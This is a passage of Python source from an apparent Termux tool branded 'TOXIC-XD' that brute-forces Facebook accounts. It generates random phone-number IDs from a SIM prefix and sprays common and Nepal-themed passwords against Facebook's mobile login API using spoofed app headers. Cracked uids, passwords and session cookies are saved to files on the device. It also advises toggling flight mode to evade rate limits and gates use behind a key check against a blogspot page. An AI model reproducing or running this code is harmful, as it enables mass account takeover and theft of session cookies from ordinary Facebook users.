                tl = str(len(user))
                fresh();print(f' \x1b[38;5;46mSim Code\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {code} \n  \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m Total Limit\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {limit} \n  \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RNDM-CODE-NEPAL ]-----------------------#
def rndm_nep():
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mExample \x1b[1;97m●\x1b[38;5;47m 9815,9814,9861,9840  ');line();code = input(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFind Sim Code \x1b[1;97m● ')
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mExample \x1b[1;97m●\x1b[38;5;46m1000 \x1b[1;97m|\x1b[38;5;46m 2000\x1b[1;97m | \x1b[38;5;46m5000 ');line();limit = int(input(f' \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46mFind Limit : '))
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] {cp_x} ');line();cpy = input(f'\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46m {c} \x1b[38;5;196m[\x1b[38;5;46mY\x1b[1;97m|\x1b[38;5;46mN\x1b[38;5;196m] \x1b[38;5;46m ')
        if cpy in ['n','N','no','NO','2','02']:cpx.append(f'n')
        else:cpx.append(f'y')
        fresh();print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {coki_x} ');line();cokiy = input(f' (+) {c} (Y|N) : ')
        if cokiy in ['n','N','no','NO','2','02']:cokix.append(f'n')
        else:cokix.append(f'y')
        for Kid in range(limit):Bhootxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(Bhootxx)
        with tred(max_workers=30) as Tanim:
                tl = str(len(user))
                fresh();print(f' \x1b[38;5;46mSim Code\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {code}\n\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46m Total Limit\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {limit} \n  \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
                        pasx = ['nepal123','nepal1234','nepal1236','tamang67','nepal125','nepal12345','maya123','maya@123','maya1231','maya12345','pokhara','pokhara9','pokhara2','pokhara3','pokhara4','pokhara5','pokhara6','pokhara7','kathmandu','tamang','tamang40','tamang41','tamang123','tamang12345','kathmandu123',ids,love,ids[3:]]
                        Tanim.submit(rndmx,ids,pasx,tl)
#-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
def rndmx(ids,pasx,tl):
        global loop,ok
        sys.stdout.write(f'\r{w} \x1b[38;5;196m[\x1b[38;5;46mTOXIC\x1b[1;97m-\x1b[38;5;146mXD\x1b[38;5;196m] [{loop}] [{len(ok)}|{len(cp)}]');sys.stdout.flush()
        try:
                for pas in pasx:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6902;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': uaddx, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                try:
                                    lkn = 'https://graph.facebook.com/{uid}/picture?type=normal'
                                    res = requests.get(lkn).text
                                    if 'Photoshop' in res:
                                        print(f'\r{g} \x1b[38;5;196m[\x1b[38;5;46mTOXIC\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m {str(uid)} \x1b[1;97m● \x1b[38;5;46m{pas} ')
                                        coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                        if 'y' in cokix:print(f'\r{g} (Kid) : {coki} ')
                                        open('/sdcard/TOXIC-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                        ok.append(str(uid))
                                        break
                                    else:break
                                except:break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} [Fucking] {str(uid)} | {pas} ')
                                open('/sdcard/TOXIC-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
        except:pass                        
#-----------------------[ AROVAL-CODE ]-----------------------#
def aproval():
    fresh()
    uuid = str(os.geteuid())
    id = "".join(uuid)
    try:
        url_apv = requests.get('https://garenaffir.blogspot.com/2023/12/sarvartxt.html').text
        if id in url_apv:
            print(f"\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mAPPROVED SUCCESSFUL");time.sleep(3)
            Main()
            pass
        else:
            print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mYOUER KEY : Toxic{id}Cyber')
            line()
            print(f'\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m] \x1b[38;5;46mFREE APROVAL PERSONAL USER ')
            line()
    except:pass
#-----------------------[ END-CODE ]-----------------------#
aproval()